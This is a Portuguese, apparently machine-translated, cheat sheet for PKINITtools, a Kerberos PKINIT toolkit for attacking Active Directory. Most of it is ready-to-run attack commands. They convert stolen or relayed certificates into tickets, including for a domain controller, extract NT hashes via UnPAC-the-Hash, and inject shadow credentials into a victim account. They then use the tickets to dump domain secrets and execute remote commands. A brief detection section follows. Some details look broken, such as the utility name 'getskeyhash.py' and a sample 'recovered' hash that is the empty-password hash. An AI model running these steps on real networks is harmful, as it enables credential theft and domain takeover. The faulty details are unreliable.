<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎫 PKINITtools - Folha de dicas completa

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="Licença MIT">
</p>

<p alinhar="centro">
  <b>🌐 Ferramentas para criptografia de chave pública Kerberos para autenticação inicial (PKINIT), convertendo certificados em tickets TGT e recuperando hashes NT</b>
</p>

---

## 📋 Índice

- [Visão geral e arquitetura PKINIT](#-overview--the-pkinit-architecture)
- [Utilitários-chave: `gettgtpkinit.py` e `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
- [Instalação](#-instalação)
- [Convertendo certificados AD CS em Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [Usando um arquivo PFX](#using-a-pfx-file)
  - [Usando PFX codificado em Base64 (cadeias de relé)](#using-base64-encoded-pfx-relay-chains)
- [Recuperando Hashes NT (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
- [Fluxo de trabalho de ataque de credenciais de sombra](#-shadow-credentials-attack-workflow)
- [Consumindo o TGT com Impacket & NetExec](#-consumindo-o-tgt-with-impacket--netexec)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e detecção](#-considerações defensivas--detecção)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e arquitetura PKINIT

**PKINIT** (criptografia de chave pública para autenticação inicial em Kerberos, definida em **RFC 4556**) é uma extensão do protocolo Kerberos. Em vez de exigir um hash de senha secreta de um usuário (NTLM ou AES) para solicitar um Kerberos Ticket Granting Ticket (TGT), o PKINIT permite que um cliente comprove a identidade usando **certificados digitais X.509 e pares de chaves privadas/públicas**.

Criado pelo renomado pesquisador do Active Directory **Dirk-jan Mollema (@_dirkjan)**, **PKINITtools** fornece os primitivos essenciais do Python para:
1. Autentique-se nos controladores de domínio do Active Directory via PKINIT usando certificados digitais extraídos ou retransmitidos.
2. Obtenha um arquivo Kerberos TGT padrão (`.ccache`).
3. Recupere o texto não criptografado **NTLM Hash** da conta por meio do mecanismo **UnPAC-the-Hash**.

---

## 🧰 Principais utilitários: `gettgtpkinit.py` e `getskeyhash.py`

- **`gettgtpkinit.py`**: Comunica-se com o KDC (Kerberos Key Distribution Center) pela porta 88, apresenta o certificado e solicita um TGT blindado, salvando-o como um arquivo Kirbi ou ccache.
- **`getskeyhash.py`**: interroga o Kerberos PAC (Certificado de Atributo de Privilégio) retornado no ticket PKINIT para calcular e expor o hash NT estático da conta.

---

## 📥 Instalação
```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```
---

## 🎫 Convertendo certificados AD CS em Kerberos TGT

Ao obter um certificado do Active Directory via Certipy, Coercer ou NTLM Relay:

### Usando um arquivo PFX
```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```
### Usando PFX codificado em Base64 (cadeias de relé)

Freqüentemente, `ntlmrelayx` imprime certificados como uma string base64 bruta durante ataques AD CS ESC8:
```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```
---

## 🔑 Recuperando Hashes NT (UnPAC-the-Hash)

Quando uma conta é autenticada com PKINIT, o controlador de domínio assina o PAC com uma estrutura PAC_CREDENTIAL_INFO contendo o **hash NTLM** estático da conta (criptografado com uma chave AS-REP temporária). `getskeyhash.py` descriptografa esta estrutura:
```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
Com o hash do NT em mãos, você pode executar imediatamente **Pass-the-Hash** ou cracking offline!

---

## 👥 Fluxo de trabalho de ataque de credenciais de sombra

Quando você tem acesso de gravação em um objeto do Active Directory (`GenericAll`, `GenericWrite`, `WriteProperty` sobre `msDS-KeyCredentialLink`):
```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```
---

## 🚀 Consumindo o TGT com Impacket e NetExec

Depois que `gettgtpkinit.py` gerar um ticket `.ccache`, exporte-o para o ambiente:
```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **TGT via arquivo PFX** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
| **TGT via certificado Base64** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
| **Especifique o controlador de domínio**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
| **UnPAC-the-Hash (obtenha NTLM)**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| **Passe TGT para Impacket** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| **Passe TGT para NetExec** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ Considerações defensivas e detecção

1. **ID do Evento 4768 (Solicitação TGT):** O Active Directory registra solicitações Kerberos TGT. Quando PKINIT é usado, o campo **Tipo de pré-autenticação** mostra `16` (PKINIT), em vez de `2` (PA-ENC-TIMESTAMP).
2. **Auditoria de modificações de `msDS-KeyCredentialLink`:** O ID de evento 5136 registra modificações de objeto de diretório. Alerta quando as credenciais principais são anexadas a contas gerenciadas que não são do Azure/Intune.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> O PKINITtools destina-se apenas a auditorias de segurança autorizadas do Active Directory, operações do Red Team e pesquisas educacionais. A manipulação de tickets Kerberos corporativos sem permissão explícita é ilegal.